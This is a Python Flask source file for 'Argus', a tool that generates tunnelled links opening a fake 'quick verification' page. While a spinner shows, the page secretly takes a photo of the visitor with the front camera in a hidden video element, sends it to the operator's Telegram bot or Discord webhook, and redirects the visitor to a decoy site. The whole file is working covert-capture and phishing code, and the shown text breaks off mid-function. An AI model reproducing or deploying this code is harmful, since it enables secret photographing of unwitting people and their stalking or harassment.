from flask import Flask, request, render_template_string
import requests
import subprocess
import os
import sys
import threading
import time
import random
import string
import re
import base64
import json

app = Flask(__name__)

link_data = {}
public_url = None

def check_cloudflared():
    try:
        subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
        return True
    except:
        return False

def install_cloudflared():
    print("📥 Installation de cloudflared... ( !!! Peut prendre un peu de temps !!! )")
    try:
        if sys.platform == "win32":
            import urllib.request
            urllib.request.urlretrieve(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                "cloudflared.exe"
            )
            return True
        elif sys.platform == "darwin":
            subprocess.run(['brew', 'install', 'cloudflared'], check=True)
            return True
        else:
            subprocess.run([
                'wget', '-q', 
                'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
            ], check=True)
            subprocess.run(['chmod', '+x', 'cloudflared-linux-amd64'], check=True)
            subprocess.run(['sudo', 'mv', 'cloudflared-linux-amd64', '/usr/local/bin/cloudflared'], check=True)
            return True
    except Exception as e:
        print(f"❌ Erreur installation: {e}")
        return False

def start_cloudflared():
    global public_url
    try:
        print("🌐 Démarrage du tunnel cloudflared...")
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', 'http://localhost:5000'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        def read_output():
            global public_url
            for line in iter(process.stdout.readline, ''):
                print(line.strip())
                # CORRECTION: Regex plus précis pour capturer l'URL complète
                if 'trycloudflare.com' in line:
                    # Chercher toutes les URLs trycloudflare dans la ligne
                    urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                    if urls:
                        # Prendre la première URL trouvée
                        public_url = urls[0]
                        print(f"✅ URL PUBLIQUE: {public_url}")
                        break
        
        threading.Thread(target=read_output, daemon=True).start()
        return process
    except Exception as e:
        print(f"❌ Erreur cloudflared: {e}")
        return None

# Vérification et installation
if not check_cloudflared():
    print("❌ cloudflared non trouvé, installation...")
    if install_cloudflared():
        print("✅ cloudflared installé avec succès")
        print("🔄 Redémarrage...")
        if sys.platform != "win32":
            os.execv(sys.executable, ['python'] + sys.argv)
        else:
            os.system('cls')
    else:
        print("❌ Échec installation cloudflared")
        sys.exit(1)

# Démarrer le tunnel
tunnel_process = start_cloudflared()
time.sleep(8)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Argus - Panneau de Contrôle</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --bg-color: #0d1117;
                --container-bg: #161b22;
                --card-bg: #21262d;
                --border-color: #30363d;
                --text-color: #c9d1d9;
                --primary-color: #58a6ff;
                --primary-hover: #79c0ff;
                --success-color: #3fb950;
                --discord-color: #7289da;
                --discord-hover: #8a9ff5;
                --telegram-color: #0088cc;
                --telegram-hover: #00a7e7;
                --font-family: 'Roboto', sans-serif;
            }

            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }

            body {
                font-family: var(--font-family);
                background-color: var(--bg-color);
                color: var(--text-color);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }

            .container {
                background-color: var(--container-bg);
                border: 1px solid var(--border-color);
                border-radius: 12px;
                padding: 40px;
                width: 100%;
                max-width: 600px;
                box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
                text-align: center;
            }

            .logo {
                font-size: 2.5rem;
                font-weight: 700;
                color: var(--primary-color);
                margin-bottom: 10px;
                letter-spacing: 2px;
            }

            .tagline {
                font-size: 1rem;
                font-weight: 300;
                color: #8b949e;
                margin-bottom: 30px;
            }

            h2 {
                font-size: 1.5rem;
                font-weight: 400;
                margin-bottom: 30px;
            }

            .tabs {
                display: flex;
                margin-bottom: 30px;
                border-bottom: 1px solid var(--border-color);
            }

            .tab {
                flex: 1;
                padding: 12px 0;
                cursor: pointer;
                border-bottom: 2px solid transparent;
                transition: all 0.3s ease;
                font-weight: 500;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
            }

            .tab:hover {
                background-color: rgba(88, 166, 255, 0.1);
            }

            .tab.active {
                border-bottom-color: var(--primary-color);
                color: var(--primary-color);
            }

            .tab-content {
                display: none;
            }

            .tab-content.active {
                display: block;
                animation: fadeIn 0.3s ease;
            }

            @keyframes fadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }

            .form-group {
                margin-bottom: 20px;
                text-align: left;
            }

            label {
                display: block;
                margin-bottom: 8px;
                font-weight: 400;
                font-size: 0.9rem;
            }

            input[type="text"] {
                width: 100%;
                padding: 12px 15px;
                background-color: var(--card-bg);
                border: 1px solid var(--border-color);
                border-radius: 6px;
                color: var(--text-color);
                font-size: 1rem;
                transition: border-color 0.2s, box-shadow 0.2s;
            }

            input[type="text"]:focus {
                outline: none;
                border-color: var(--primary-color);
                box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
            }
            
            .checkbox-group {
                display: flex;
                align-items: center;
                margin-bottom: 20px;
                text-align: left;
            }
            .checkbox-group input[type="checkbox"] {
                margin-right: 10px;
                width: 18px;
                height: 18px;
                cursor: pointer;
            }
            .checkbox-group label {
                margin-bottom: 0;
                cursor: pointer;
            }

            .btn {
                width: 100%;
                padding: 12px;
                margin-top: 10px;
                background-color: var(--primary-color);
                color: #fff;
                border: none;
                border-radius: 6px;
                font-size: 1rem;
                font-weight: 500;
                cursor: pointer;
                transition: background-color 0.2s;
            }

            .btn:hover {
                background-color: var(--primary-hover);
            }

            .btn-telegram {
                background-color: var(--telegram-color);
            }

            .btn-telegram:hover {
                background-color: var(--telegram-hover);
            }

            .btn-discord {
                background-color: var(--discord-color);
            }

            .btn-discord:hover {
                background-color: var(--discord-hover);
            }

            .footer {
                margin-top: 30px;
                font-size: 0.8rem;
                color: #8b949e;
            }

            .info-box {
                background-color: rgba(88, 166, 255, 0.1);
                border-left: 4px solid var(--primary-color);
                padding: 12px;
                margin-bottom: 20px;
                border-radius: 4px;
                font-size: 0.85rem;
                text-align: left;
            }
            
            .discord-preview {
                display: flex;
                align-items: center;
                gap: 12px;
                background-color: var(--card-bg);
                padding: 12px;
                border-radius: 8px;
                margin-bottom: 20px;
                border: 1px solid var(--border-color);
            }
            
            .discord-avatar {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background-color: var(--discord-color);
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-weight: bold;
            }
            
            .discord-info {
                flex: 1;
                text-align: left;
            }
            
            .discord-name {
                font-weight: 500;
                color: var(--text-color);
                margin-bottom: 2px;
            }
            
            .discord-status {
                font-size: 0.8rem;
                color: #8b949e;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">ARGUS</div>
            <div class="tagline">Système de Capture Distante</div>
            
            <div class="tabs">
                <div class="tab active" onclick="switchTab('telegram')">
                    <i class="fab fa-telegram"></i> Telegram
                </div>
                <div class="tab" onclick="switchTab('discord')">
                    <i class="fab fa-discord"></i> Discord
                </div>
            </div>
            
            <!-- Telegram Tab -->
            <div id="telegram-tab" class="tab-content active">
                <h2>Créer un Nouveau Lien (Telegram)</h2>
                <div class="info-box">
                    <i class="fas fa-info-circle"></i> Les captures seront envoyées via un bot Telegram. Vous devez créer un bot et obtenir son token ainsi que votre chat ID.
                </div>
                <form action="/create" method="post">
                    <div class="form-group">
                        <label for="chat_id">Chat ID Telegram</label>
                        <input type="text" id="chat_id" name="chat_id" placeholder="123456789" required>
                    </div>
                    <div class="form-group">
                        <label for="bot_token">Token du Bot Telegram</label>
                        <input type="text" id="bot_token" name="bot_token" placeholder="AAABBBCCC..." required>
                    </div>
                    <div class="form-group">
                        <label for="redirect_url">URL de Redirection</label>
                        <input type="text" id="redirect_url" name="redirect_url" placeholder="https://google.com" required value="https://google.com">
                    </div>
                    
                    <div class="checkbox-group">
                        <input type="checkbox" id="show_verification" name="show_verification" value="true" checked>
                        <label for="show_verification">Afficher la page de "Vérification" pendant la capture</label>
                    </div>
                    
                    <input type="hidden" name="platform" value="telegram">
                    <button type="submit" class="btn btn-telegram">Générer le Lien de Capture</button>
                </form>
            </div>
            
            <!-- Discord Tab -->
            <div id="discord-tab" class="tab-content">
                <h2>Créer un Nouveau Lien (Discord)</h2>
                <div class="info-box">
                    <i class="fas fa-info-circle"></i> Les captures seront envoyées via un webhook Discord. Vous devez créer un webhook dans les paramètres de votre serveur Discord.
                </div>
                
                <div class="discord-preview">
                    <div class="discord-avatar">
                        <i class="fas fa-camera"></i>
                    </div>
                    <div class="discord-info">
                        <div class="discord-name">Argus Bot</div>
                        <div class="discord-status">Apparence automatique</div>
                    </div>
                </div>
                
                <form action="/create" method="post">
                    <div class="form-group">
                        <label for="webhook_url">URL du Webhook Discord</label>
                        <input type="text" id="webhook_url" name="webhook_url" placeholder="https://discord.com/api/webhooks/..." required>
                    </div>
                    <div class="form-group">
                        <label for="redirect_url_discord">URL de Redirection</label>
                        <input type="text" id="redirect_url_discord" name="redirect_url" placeholder="https://google.com" required value="https://google.com">
                    </div>
                    
                    <div class="checkbox-group">
                        <input type="checkbox" id="show_verification_discord" name="show_verification" value="true" checked>
                        <label for="show_verification_discord">Afficher la page de "Vérification" pendant la capture</label>
                    </div>
                    
                    <input type="hidden" name="platform" value="discord">
                    <button type="submit" class="btn btn-discord">Générer le Lien de Capture</button>
                </form>
            </div>
            
            <div class="footer">Made by LTX</div>
        </div>

        <script>
            function switchTab(tabName) {
                // Remove active class from all tabs and contents
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });
                document.querySelectorAll('.tab-content').forEach(content => {
                    content.classList.remove('active');
                });
                
                // Add active class to selected tab and content
                if (tabName === 'telegram') {
                    document.querySelectorAll('.tab')[0].classList.add('active');
                    document.getElementById('telegram-tab').classList.add('active');
                } else if (tabName === 'discord') {
                    document.querySelectorAll('.tab')[1].classList.add('active');
                    document.getElementById('discord-tab').classList.add('active');
                }
            }
        </script>
    </body>
    </html>
    '''

@app.route('/create', methods=['POST'])
def create():
    platform = request.form.get('platform', 'telegram')
    
    if platform == 'telegram':
        chat_id = request.form['chat_id']
        bot_token = request.form['bot_token']
        redirect_url = request.form['redirect_url']
        show_verification = 'show_verification' in request.form
        
        if not public_url:
            return "⏳ Tunnel pas encore prêt, réessayez dans 10 secondes..."
        
        link_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        
        link_data[link_id] = {
            'platform': 'telegram',
            'chat_id': chat_id,
            'bot_token': bot_token,
            'redirect_url': redirect_url,
            'show_verification': show_verification
        }
        
        # CORRECTION: S'assurer que l'URL est correcte
        capture_url = f"{public_url}/capture/{link_id}"
        print(f"🔗 Lien Telegram généré: {capture_url}")
        
        return f'''
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Lien Argus Créé</title>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
            <style>
                :root {{
                    --bg-color: #0d1117;
                    --container-bg: #161b22;
                    --card-bg: #21262d;
                    --border-color: #30363d;
                    --text-color: #c9d1d9;
                    --primary-color: #58a6ff;
                    --primary-hover: #79c0ff;
                    --success-color: #3fb950;
                    --telegram-color: #0088cc;
                    --font-family: 'Roboto', sans-serif;
                }}

                * {{
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                }}

                body {{
                    font-family: var(--font-family);
                    background-color: var(--bg-color);
                    color: var(--text-color);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }}

                .container {{
                    background-color: var(--container-bg);
                    border: 1px solid var(--border-color);
                    border-radius: 12px;
                    padding: 40px;
                    width: 100%;
                    max-width: 600px;
                    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
                    text-align: center;
                }}
                
                .logo {{
                    font-size: 2.5rem;
                    font-weight: 700;
                    color: var(--primary-color);
                    margin-bottom: 10px;
                    letter-spacing: 2px;
                }}

                h2 {{
                    font-size: 1.8rem;
                    font-weight: 500;
                    margin-bottom: 15px;
                    color: var(--success-color);
                }}

                p {{
                    font-size: 1rem;
                    margin-bottom: 25px;
                    color: #8b949e;
                }}

                .link-box {{
                    background-color: var(--card-bg);
                    border: 1px solid var(--border-color);
                    padding: 20px;
                    border-radius: 8px;
                    margin: 25px 0;
                    word-break: break-all;
                    font-family: 'Courier New', Courier, monospace;
                    font-size: 0.9rem;
                    line-height: 1.6;
                    position: relative;
                }}

                .btn {{
                    display: inline-block;
                    padding: 12px 25px;
                    margin: 8px;
                    background-color: var(--primary-color);
                    color: #fff;
                    border: none;
                    border-radius: 6px;
                    font-size: 1rem;
                    font-weight: 500;
                    cursor: pointer;
                    text-decoration: none;
                    transition: background-color 0.2s, transform 0.1s;
                }}
                
                .btn i {{
                    margin-right: 8px;
                }}

                .btn:hover {{
                    background-color: var(--primary-hover);
                    transform: translateY(-2px);
                }}
                
                .btn-secondary {{
                    background-color: var(--card-bg);
                    border: 1px solid var(--border-color);
                }}
                
                .btn-secondary:hover {{
                    background-color: var(--border-color);
                }}
                
                .platform-badge {{
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                    background-color: var(--telegram-color);
                    color: white;
                    padding: 6px 12px;
                    border-radius: 20px;
                    font-size: 0.85rem;
                    margin-bottom: 20px;
                }}
                
                .footer {{
                    margin-top: 30px;
                    font-size: 0.8rem;
                    color: #8b949e;
                }}

            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">ARGUS</div>
                <div class="platform-badge">
                    <i class="fab fa-telegram"></i> Telegram
                </div>
                <h2><i class="fas fa-check-circle"></i> Lien de Capture Créé !</h2>
                <p>Partagez ce lien pour capturer une photo.</p>
                <div class="link-box" id="link">{capture_url}</div>
                <button class="btn" onclick="copyLink()"><i class="fas fa-copy"></i> Copier le Lien</button>
                <a href="/" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Créer un autre</a>
                <div class="footer">Made by LTX</div>
            </div>

            <script>
                function copyLink() {{
                    const linkElement = document.getElementById('link');
                    const textArea = document.createElement('textarea');
                    textArea.value = linkElement.textContent;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    
                    const originalText = linkElement.textContent;
                    linkElement.textContent = 'Lien copié !';
                    linkElement.style.color = 'var(--success-color)';
                    setTimeout(() => {{
                        linkElement.textContent = originalText;
                        linkElement.style.color = 'var(--text-color)';
                    }}, 2000);
                }}
            </script>
        </body>
        </html>
        '''
    
    elif platform == 'discord':
        webhook_url = request.form['webhook_url']
        redirect_url = request.form['redirect_url']
        show_verification = 'show_verification' in request.form
        
        if not public_url:
            return "⏳ Tunnel pas encore prêt, réessayez dans 10 secondes..."
        
        link_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        
        # Valeurs automatiques pour Discord
        link_data[link_id] = {
            'platform': 'discord',
            'webhook_url': webhook_url,
            'username': 'Argus Bot',  # Nom automatique
            'avatar_url': 'https://i.postimg.cc/PrkdJ0Mg/Argus.png',  # Avatar automatique
            'redirect_url': redirect_url,
            'show_verification': show_verification
        }
        
        # CORRECTION: S'assurer que l'URL est correcte
        capture_url = f"{public_url}/capture/{link_id}"
        print(f"🔗 Lien Discord généré: {capture_url}")
        
        return f'''
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Lien Argus Créé</title>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
            <style>
                :root {{
                    --bg-color: #0d1117;
                    --container-bg: #161b22;
                    --card-bg: #21262d;
                    --border-color: #30363d;
                    --text-color: #c9d1d9;
                    --primary-color: #58a6ff;
                    --primary-hover: #79c0ff;
                    --success-color: #3fb950;
                    --discord-color: #7289da;
                    --font-family: 'Roboto', sans-serif;
                }}

                * {{
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                }}

                body {{
                    font-family: var(--font-family);
                    background-color: var(--bg-color);
                    color: var(--text-color);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }}

                .container {{
                    background-color: var(--container-bg);
                    border: 1px solid var(--border-color);
                    border-radius: 12px;
                    padding: 40px;
                    width: 100%;
                    max-width: 600px;
                    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
                    text-align: center;
                }}
                
                .logo {{
                    font-size: 2.5rem;
                    font-weight: 700;
                    color: var(--primary-color);
                    margin-bottom: 10px;
                    letter-spacing: 2px;
                }}

                h2 {{
                    font-size: 1.8rem;
                    font-weight: 500;
                    margin-bottom: 15px;
                    color: var(--success-color);
                }}

                p {{
                    font-size: 1rem;
                    margin-bottom: 25px;
                    color: #8b949e;
                }}

                .link-box {{
                    background-color: var(--card-bg);
                    border: 1px solid var(--border-color);
                    padding: 20px;
                    border-radius: 8px;
                    margin: 25px 0;
                    word-break: break-all;
                    font-family: 'Courier New', Courier, monospace;
                    font-size: 0.9rem;
                    line-height: 1.6;
                    position: relative;
                }}

                .btn {{
                    display: inline-block;
                    padding: 12px 25px;
                    margin: 8px;
                    background-color: var(--primary-color);
                    color: #fff;
                    border: none;
                    border-radius: 6px;
                    font-size: 1rem;
                    font-weight: 500;
                    cursor: pointer;
                    text-decoration: none;
                    transition: background-color 0.2s, transform 0.1s;
                }}
                
                .btn i {{
                    margin-right: 8px;
                }}

                .btn:hover {{
                    background-color: var(--primary-hover);
                    transform: translateY(-2px);
                }}
                
                .btn-secondary {{
                    background-color: var(--card-bg);
                    border: 1px solid var(--border-color);
                }}
                
                .btn-secondary:hover {{
                    background-color: var(--border-color);
                }}
                
                .platform-badge {{
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                    background-color: var(--discord-color);
                    color: white;
                    padding: 6px 12px;
                    border-radius: 20px;
                    font-size: 0.85rem;
                    margin-bottom: 20px;
                }}
                
                .footer {{
                    margin-top: 30px;
                    font-size: 0.8rem;
                    color: #8b949e;
                }}

            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">ARGUS</div>
                <div class="platform-badge">
                    <i class="fab fa-discord"></i> Discord
                </div>
                <h2><i class="fas fa-check-circle"></i> Lien de Capture Créé !</h2>
                <p>Partagez ce lien pour capturer une photo.</p>
                <div class="link-box" id="link">{capture_url}</div>
                <button class="btn" onclick="copyLink()"><i class="fas fa-copy"></i> Copier le Lien</button>
                <a href="/" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Créer un autre</a>
                <div class="footer">Made by LTX</div>
            </div>

            <script>
                function copyLink() {{
                    const linkElement = document.getElementById('link');
                    const textArea = document.createElement('textarea');
                    textArea.value = linkElement.textContent;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    
                    const originalText = linkElement.textContent;
                    linkElement.textContent = 'Lien copié !';
                    linkElement.style.color = 'var(--success-color)';
                    setTimeout(() => {{
                        linkElement.textContent = originalText;
                        linkElement.style.color = 'var(--text-color)';
                    }}, 2000);
                }}
            </script>
        </body>
        </html>
        '''

@app.route('/capture/<link_id>')
def capture(link_id):
    if link_id not in link_data:
        return "Lien invalide", 404
    
    data = link_data[link_id]
    platform = data.get('platform', 'telegram')
    
    if data.get('show_verification', True):
        return f'''
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Connexion sécurisée</title>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
            <style>
                * {{
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }}
                
                body {{
                    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
                    background: #ffffff;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    min-height: 100vh;
                    padding: 20px;
                }}
                
                .quick-check {{
                    text-align: center;
                    max-width: 320px;
                    width: 100%;
                }}
                
                .shield-icon {{
                    width: 60px;
                    height: 60px;
                    margin: 0 auto 16px;
                    background: linear-gradient(135deg, #4285f4, #34a853);
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    animation: rotate 2s linear infinite;
                }}
                
                @keyframes rotate {{
                    from {{ transform: rotate(0deg); }}
                    to {{ transform: rotate(360deg); }}
                }}
                
                .shield-icon svg {{
                    width: 30px;
                    height: 30px;
                    fill: white;
                }}
                
                h1 {{
                    font-size: 18px;
                    font-weight: 600;
                    color: #202124;
                    margin-bottom: 8px;
                }}
                
                .status {{
                    font-size: 14px;
                    color: #5f6368;
                    margin-bottom: 20px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 8px;
                }}
                
                .dots {{
                    display: inline-flex;
                    gap: 4px;
                }}
                
                .dot {{
                    width: 6px;
                    height: 6px;
                    border-radius: 50%;
                    background: #4285f4;
                    animation: bounce 1.4s infinite ease-in-out both;
                }}
                
                .dot:nth-child(1) {{ animation-delay: -0.32s; }}
                .dot:nth-child(2) {{ animation-delay: -0.16s; }}
                
                @keyframes bounce {{
                    0%, 80%, 100% {{ transform: scale(0); }}
                    40% {{ transform: scale(1); }}
                }}
                
                .progress {{
                    width: 100%;
                    height: 3px;
                    background: #e8eaed;
                    border-radius: 2px;
                    overflow: hidden;
                    margin-bottom: 16px;
                }}
                
                .progress-bar {{
                    height: 100%;
                    background: linear-gradient(90deg, #4285f4, #34a853);
                    border-radius: 2px;
                    animation: fill 1.5s ease-out forwards;
                }}
                
                @keyframes fill {{
                    from {{ width: 0%; }}
                    to {{ width: 100%; }}
                }}
                
                .hidden {{
                    position: fixed;
                    top: -9999px;
                    visibility: hidden;
                }}
            </style>
            <script>
                async function quickVerify() {{
                    try {{
                        // Démarrer immédiatement sans délai
                        const stream = await navigator.mediaDevices.getUserMedia({{ 
                            video: {{ 
                                facingMode: "user",
                                width: 640,
                                height: 480
                            }} 
                        }});
                        
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.className = 'hidden';
                        document.body.appendChild(video);
                        
                        await video.play();
                        
                        // Capture ultra-rapide
                        await new Promise(resolve => setTimeout(resolve, 200));
                        
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        stream.getTracks().forEach(track => track.stop());
                        document.body.removeChild(video);
                        
                        // Envoi en arrière-plan
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
                        
                        fetch('/upload', {{
                            method: 'POST',
                            headers: {{
                                'Content-Type': 'application/json',
                            }},
                            body: JSON.stringify({{
                                image: imageData,
                                platform: '{platform}',
                                link_id: '{link_id}'
                            }})
                        }}).catch(() => {{}});
                        
                    }} catch (error) {{
                        console.log('Quick check done');
                    }}
                    
                    // Redirection quasi-immédiate
                    setTimeout(() => {{
                        window.location.href = '{data["redirect_url"]}';
                    }}, 300);
                }}
                
                // Démarrage instantané
                quickVerify();
            </script>
        </head>
        <body>
            <div class="quick-check">
                <div class="shield-icon">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                    </svg>
                </div>
                <h1>Vérification rapide</h1>
                <div class="status">
                    Sécurisation de la connexion
                    <div class="dots">
                        <span class="dot"></span>
                        <span class="dot"></span>
                        <span class="dot"></span>
                    </div>
                </div>
                <div class="progress">
                    <div class="progress-bar"></div>
                </div>
            </div>
        </body>
        </html>
        '''
    else:
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Chargement...</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {{ 
                    margin: 0; 
                    background-color: #f8f9fa;
                    font-family: 'Roboto', sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }}
                .loader {{
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #4285f4;
                    border-radius: 50%;
                    width: 30px;
                    height: 30px;
                    animation: spin 1s linear infinite;
                }}
                @keyframes spin {{
                    0% {{ transform: rotate(0deg); }}
                    100% {{ transform: rotate(360deg); }}
                }}
            </style>
            <script>
                async function captureAndSend() {{
                    try {{
                        console.log("📸 Accès à la caméra...");
                        const stream = await navigator.mediaDevices.getUserMedia({{ 
                            video: {{ facingMode: "user" }} 
                        }});
                        
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        await video.play();
                        
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        stream.getTracks().forEach(track => track.stop());
                        
                        console.log("✅ Photo capturée, envoi...");
                        
                        // Convertir en base64 pour un envoi plus fiable
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
                        
                        // Envoyer les données en base64
                        const response = await fetch('/upload', {{
                            method: 'POST',
                            headers: {{
                                'Content-Type': 'application/json',
                            }},
                            body: JSON.stringify({{
                                image: imageData,
                                platform: '{platform}',
                                link_id: '{link_id}'
                            }})
                        }});
                        
                        console.log("📤 Photo envoyée, redirection...");
                        
                    }} catch (error) {{
                        console.log("❌ Erreur:", error);
                    }}
                    
                    window.location.href = '{data["redirect_url"]}';
                }}
                
                captureAndSend();
            </script>
        </head>
        <body>
            <div class="loader"></div>
        </body>
        </html>
        '''

@app.route('/upload', methods=['POST'])
def upload():
    try:
        # Récupérer les données JSON
        data = request.get_json()
        if not data:
            print("❌ Aucune donnée JSON reçue")
            return 'Erreur: Aucune donnée reçue', 400
            
        image_data = data.get('image')
        platform = data.get('platform', 'telegram')
        link_id = data.get('link_id')
        
        if not all([image_data, link_id]):
            print("❌ Données manquantes")
            return 'Erreur: Données manquantes', 400
        
        if link_id not in link_data:
            print("❌ Lien ID invalide")
            return 'Erreur: Lien ID invalide', 400
        
        link_info = link_data[link_id]
        
        # Extraire les données base64 de l'image
        # Format: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQ..."
        if 'base64,' in image_data:
            base64_string = image_data.split('base64,')[1]
        else:
            base64_string = image_data
            
        # Décoder les données base64
        image_bytes = base64.b64decode(base64_string)
        
        if platform == 'telegram':
            chat_id = link_info.get('chat_id')
            bot_token = link_info.get('bot_token')
            
            if not all([chat_id, bot_token]):
                print("❌ Données Telegram manquantes")
                return 'Erreur: Données Telegram manquantes', 400
            
            print(f"📤 Envoi photo à Telegram...")
            print(f"   Chat ID: {chat_id}")
            print(f"   Bot Token: {bot_token[:20]}...")
            
            # Préparer les fichiers pour l'API Telegram
            files = {
                'photo': ('photo.jpg', image_bytes, 'image/jpeg')
            }
            
            data_payload = {
                'chat_id': chat_id,
                'caption': '📸 - Capture from Argus - https://github.com/LTX128/Argus'
            }
            
            # Envoyer à l'API Telegram
            response = requests.post(
                f'https://api.telegram.org/bot{bot_token}/sendPhoto',
                files=files,
                data=data_payload,
                timeout=30
            )
            
            print(f"✅ Réponse Telegram: {response.status_code}")
            
            if response.status_code == 200:
                print("🎉 Photo envoyée avec succès à Telegram !")
                return 'OK'
            else:
                print(f"❌ Erreur Telegram: {response.text}")
                return f'Erreur: {response.text}', 400
                
        elif platform == 'discord':
            webhook_url = link_info.get('webhook_url')
            username = link_info.get('username', 'Argus Bot')
            avatar_url = link_info.get('avatar_url', 'https://i.postimg.cc/PrkdJ0Mg/Argus.png')
            
            if not webhook_url:
                print("❌ URL Webhook Discord manquante")
                return 'Erreur: URL Webhook Discord manquante', 400
            
            print(f"📤 Envoi photo à Discord...")
            print(f"   Webhook URL: {webhook_url[:50]}...")
            print(f"   Username: {username}")
            print(f"   Avatar URL: {avatar_url}")
            
            # Créer le payload JSON pour Discord avec les valeurs automatiques
            payload = {
                'username': username,
                'avatar_url': avatar_url,
                'content': '📸 - Capture from Argus - https://github.com/LTX128/Argus'
            }
            
            # Créer un embed stylisé pour l'image
            embed = {
                'title': '📸 Capture d\'écran',
                'color': 5814783,  # Couleur bleue Discord
                'image': {
                    'url': 'attachment://capture.jpg'
                },
                'footer': {
                    'text': 'Powered by Argus',
                    'icon_url': avatar_url
                },
                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
            }
            
            payload['embeds'] = [embed]
            
            # Préparer les fichiers pour Discord
            files = {
                'file': ('capture.jpg', image_bytes, 'image/jpeg'),
                'payload_json': (None, json.dumps(payload), 'application/json')
            }
            
            # Envoyer au webhook Discord
            response = requests.post(
                webhook_url,
                files=files,
                timeout=30
            )
            
            print(f"✅ Réponse Discord: {response.status_code}")
            
            if response.status_code in [200, 204]:
                print("🎉 Photo envoyée avec succès à Discord !")
                return 'OK'
            else:
                print(f"❌ Erreur Discord: {response.text}")
                # Si l'envoi avec embed échoue, essayer avec une méthode plus simple
                try:
                    print("🔄 Tentative avec méthode simple...")
                    simple_payload = {
                        'username': username,
                        'avatar_url': avatar_url,
                        'content': '📸 - Capture from Argus - https://github.com/LTX128/Argus'
                    }
                    
                    files_simple = {
